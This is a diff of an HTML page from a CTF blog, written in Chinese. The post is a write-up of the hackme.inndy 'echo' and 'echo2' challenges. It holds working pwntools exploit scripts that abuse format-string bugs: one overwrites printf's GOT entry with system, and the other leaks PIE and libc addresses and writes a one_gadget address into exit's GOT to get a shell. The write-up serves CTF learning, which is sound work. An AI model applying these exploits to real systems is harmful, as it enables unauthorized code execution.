@@ -1,1059 +1,557 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>echo 和 echo2 writeup - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="hackme.inndy 的echo 和 echo2 echo防护机制：  32位的开启了NX的程序ida反编译一下：  很明显的一个格式化字符串漏洞，加上程序中存在system函数，所以可以将printf_got覆盖成system函数，再传入”/bin/sh” 来getshell这里我用了pwntools库中的fmtstr_payload()函数 exp:12345678910111213141">
-<meta name="keywords" content="writeup,pwn">
-<meta property="og:type" content="article">
-<meta property="og:title" content="echo 和 echo2 writeup">
-<meta property="og:url" content="http://yoursite.com/2018/05/10/2018-5-10-echo-和-echo2-writeup/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="hackme.inndy 的echo 和 echo2 echo防护机制：  32位的开启了NX的程序ida反编译一下：  很明显的一个格式化字符串漏洞，加上程序中存在system函数，所以可以将printf_got覆盖成system函数，再传入”/bin/sh” 来getshell这里我用了pwntools库中的fmtstr_payload()函数 exp:12345678910111213141">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-7592ffb1af86751a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-217117907bf126dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-396921ca09fab75f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-9f343cec85d1e90e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-69a998838410508b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-ed0375ccd843b517.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-17b64763b12a367f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-f6491bf5c03b5b34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-22700c789ec187cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/8390991-9062b4e5cb322ffb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2019-01-02T07:49:09.271Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="echo 和 echo2 writeup">
-<meta name="twitter:description" content="hackme.inndy 的echo 和 echo2 echo防护机制：  32位的开启了NX的程序ida反编译一下：  很明显的一个格式化字符串漏洞，加上程序中存在system函数，所以可以将printf_got覆盖成system函数，再传入”/bin/sh” 来getshell这里我用了pwntools库中的fmtstr_payload()函数 exp:12345678910111213141">
-<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/8390991-7592ffb1af86751a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2018/05/10/2018-5-10-echo-和-echo2-writeup/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>echo 和 echo2 writeup | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/10/2018-5-10-echo-和-echo2-writeup/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">echo 和 echo2 writeup
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-05-10 23:00:05" itemprop="dateCreated datePublished" datetime="2018-05-10T23:00:05+08:00">2018-05-10</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-01-02 15:49:09" itemprop="dateModified" datetime="2019-01-02T15:49:09+08:00">2019-01-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/hackme-inndy-writeup/" itemprop="url" rel="index"><span itemprop="name">hackme.inndy_writeup</span></a></span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Thursday, May 10th 2018, 11:00 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      4 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p>hackme.inndy 的echo 和 echo2</p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>hackme.inndy 的echo 和 echo2</p>
 <h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>防护机制：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-7592ffb1af86751a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-7592ffb1af86751a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="checksec"></p>
 <p>32位的开启了NX的程序<br>ida反编译一下：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-217117907bf126dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ida"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-217117907bf126dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="ida"></p>
 <p>很明显的一个格式化字符串漏洞，加上程序中存在system函数，所以可以将printf_got覆盖成system函数，再传入”/bin/sh” 来getshell<br>这里我用了pwntools库中的fmtstr_payload()函数</p>
-<p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level= &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = remote(&apos;hackme.inndy.tw&apos;,7711) </span><br><span class="line">#p = process(&apos;./echo&apos;)</span><br><span class="line">elf = ELF(&apos;./echo&apos;)</span><br><span class="line"></span><br><span class="line">system = elf.symbols[&apos;system&apos;]</span><br><span class="line">printf_got = elf.got[&apos;printf&apos;]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">offset = 7</span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got : system&#125;) # change the got of printf to system</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.send(&quot;/bin/sh\x00&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>结果：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-396921ca09fab75f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="shell"></p>
+<p>exp:</p>
+<pre><code>from pwn import*
+context.log_level= &quot;debug&quot;
+
+p = remote(&#39;hackme.inndy.tw&#39;,7711) 
+#p = process(&#39;./echo&#39;)
+elf = ELF(&#39;./echo&#39;)
+
+system = elf.symbols[&#39;system&#39;]
+printf_got = elf.got[&#39;printf&#39;]
+bss = elf.bss()
+offset = 7
+payload = fmtstr_payload(offset,{printf_got : system}) # change the got of printf to system
+p.send(payload)
+
+p.send(&quot;/bin/sh\x00&quot;)
+p.interactive()
+</code></pre><p>结果：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-396921ca09fab75f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="shell"></p>
 <h3 id="echo2"><a href="#echo2" class="headerlink" title="echo2"></a>echo2</h3><p>防护机制：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-9f343cec85d1e90e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-9f343cec85d1e90e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
 <p>发现程序开启了PIE<br>PIE：<br>是位置无关的可执行程序，用于生成位置无关的可执行程序，所谓位置无关的可执行程序，指的是，可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可运行进程。<br>但是低两位字节是固定的，可以通过这个泄露出程序基地址</p>
 <p>ida反编译：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-69a998838410508b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-69a998838410508b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
 <p>发现这题的关键代码和前面那道题很相似，同样是一个格式化字符串漏洞，同样含有system函数，但是这一题是64位的并且开启了PIE的程序，所以需要先泄露出程序的基地址</p>
 <p>gdb调试一番：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-ed0375ccd843b517.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-ed0375ccd843b517.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
 <p>格式化字符串位于栈上，并且相对偏移为7<br>查看栈上的内容：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-17b64763b12a367f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<p>程序的栈上有printf函数的返回地址和一些其他函数的返回地址<br>所以可以通过泄露出printf函数的返回地址来计算出程序的基地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">program_base = leakmemory - offset</span><br></pre></td></tr></table></figure></p>
-<p>泄露<strong>libc_start_main+240的地址来算出libc的基地址<br>通过在发送payload的语句后加一条gdb.attach(p)语句，进入调试界面，输入vmmap命令，计算出libc_base 和 </strong>libc_start_main+240的偏移，那就可以通过泄露出来的地址得到libc_base的地址了，因为不管PIE它的地址怎么变，<strong>lib_start_main的地址到libc_base的偏移是不会变的，同时可以得到</strong>libc_start_main在libc中的偏移，通过这个偏移可以查到程序的libc的版本<a href="https://libc.blukat.me/" target="_blank" rel="noopener">libsearch</a></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc_base = __libc_start_main +<span class="number">240</span>  - offset</span><br><span class="line">offset = __libc_start_main +<span class="number">240</span> - <span class="number">0x7ffff7a0d000</span></span><br><span class="line">libc_start_main_offset = offset - <span class="number">240</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-f6491bf5c03b5b34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-17b64763b12a367f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
+<p>程序的栈上有printf函数的返回地址和一些其他函数的返回地址<br>所以可以通过泄露出printf函数的返回地址来计算出程序的基地址</p>
+<pre><code>program_base = leakmemory - offset
+</code></pre><p>泄露<strong>libc_start_main+240的地址来算出libc的基地址<br>通过在发送payload的语句后加一条gdb.attach(p)语句，进入调试界面，输入vmmap命令，计算出libc_base 和 </strong>libc_start_main+240的偏移，那就可以通过泄露出来的地址得到libc_base的地址了，因为不管PIE它的地址怎么变，<strong>lib_start_main的地址到libc_base的偏移是不会变的，同时可以得到</strong>libc_start_main在libc中的偏移，通过这个偏移可以查到程序的libc的版本<a href="https://libc.blukat.me/" target="_blank" rel="noopener">libsearch</a></p>
+<pre><code class="python">libc_base = __libc_start_main +240  - offset
+offset = __libc_start_main +240 - 0x7ffff7a0d000
+libc_start_main_offset = offset - 240
+</code></pre>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-f6491bf5c03b5b34.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"></p>
 <p>查到libc的版本</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-22700c789ec187cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>有这么多 ，一般要再泄露多一个地址，比较精准，不过一个个试也可以，这里服务器用的libc版本是 9 </p>
+<p><img src="https://upload-images.jianshu.io/upload_images/8390991-22700c789ec187cf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="/img/loading.gif" alt="image.png"><br>有这么多 ，一般要再泄露多一个地址，比较精准，不过一个个试也可以，这里服务器用的libc版本是 9 </p>
 <p>获取了lib版本后就可以开始下一步了，我没有用system函数，我用one_gadget这个工具找到了execve(“/bin/sh”,null,environ)的偏移，然后将exit_got覆盖成了one_gadget的地址，因为exit也是libc库中的函数，所以只要覆盖低五位就可以了，我用”%hn”来改写地址的内容，一次修改两个字节，改写完后输入”exit”，就可以getshell</p>
 <p>64位需要注意的是：</p>
 <ol>
 <li>它的函数地址存在’\x00’截断，所以要将函数地址放到最后</li>
 <li>控制好函数地址的相对偏移</li>
 </ol>
-<p>exp:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import*</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;hackme.inndy.tw&quot;,7712)</span><br><span class="line">#p = process(&apos;./echo2&apos;)</span><br><span class="line">elf = ELF(&apos;./echo2&apos;)</span><br><span class="line">exit_got = elf.got[&apos;exit&apos;]</span><br><span class="line"></span><br><span class="line">def memleak(offset):</span><br><span class="line">	payload = &apos;%&apos; + str(offset) + &quot;$p&quot;</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	data = p.recv()[0:-1]</span><br><span class="line">	print data</span><br><span class="line">	data = int(data,16)</span><br><span class="line">	return data</span><br><span class="line"></span><br><span class="line">log.info(&quot;************leak program base address************&quot;)</span><br><span class="line">_libc_csu_init = memleak(41)</span><br><span class="line">p_add = _libc_csu_init - 0xa03</span><br><span class="line">print &quot;base address --&gt;[%s]&quot;%hex(p_add)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_libc_start_main_add = memleak(43) - 240</span><br><span class="line">print &quot;_libc_start_main_add --&gt;[%s]&quot;%hex(_libc_start_main_add)</span><br><span class="line">_libc_start_main_offset = 0x20740</span><br><span class="line">print &quot;_libc_start_main_offset --&gt; [%s] &quot;%hex(_libc_start_main_offset)</span><br><span class="line">libc_base = _libc_start_main_add - _libc_start_main_offset</span><br><span class="line">print &quot;libc_base --&gt; [%s]&quot;%hex(libc_base) </span><br><span class="line"></span><br><span class="line">one_gadget = 0xf0897#execve(&quot;/bin/sh&quot;,null,environ)</span><br><span class="line">#one_gadget = 0xf02a4</span><br><span class="line">print &quot;one_gadget --&gt; [%s]&quot;%hex(one_gadget)</span><br><span class="line">one_gadget_add = libc_base + one_gadget</span><br><span class="line">print &quot;on_gadget_add --&gt; [%s]&quot;%hex(one_gadget_add)</span><br><span class="line"></span><br><span class="line">log.info(&quot;*********write execve address to exit_got*******&quot;)</span><br><span class="line">exit_got = p_add + exit_got</span><br><span class="line">print &quot;exit_got --&gt; [%s]&quot;%hex(exit_got)</span><br><span class="line">hex_one_gadget = hex(one_gadget_add)</span><br><span class="line">add1 = str(int(int(hex_one_gadget[-4:],16))-19)</span><br><span class="line">add2 = str(int(int(hex_one_gadget[-8:-4],16))-19)</span><br><span class="line">add3 = str(int(int(hex_one_gadget[-12:-8],16))-19)</span><br><span class="line"></span><br><span class="line">payload1 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add1 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got)</span><br><span class="line">payload2 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add2 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+2)</span><br><span class="line">payload3 = &quot;aaaaaaaaaaaaaaaaaaa%&quot; + add3 + &quot;c&quot; + &quot;%10$hn&quot; + p64(exit_got+4)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.send(&quot;exit\n&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-<p>结果：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/8390991-9062b4e5cb322ffb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>exp:</p>
+<pre><code>#!/usr/bin/env python
+# coding=utf-8
+from pwn import*
+context.log_level = &quot;debug&quot;
+
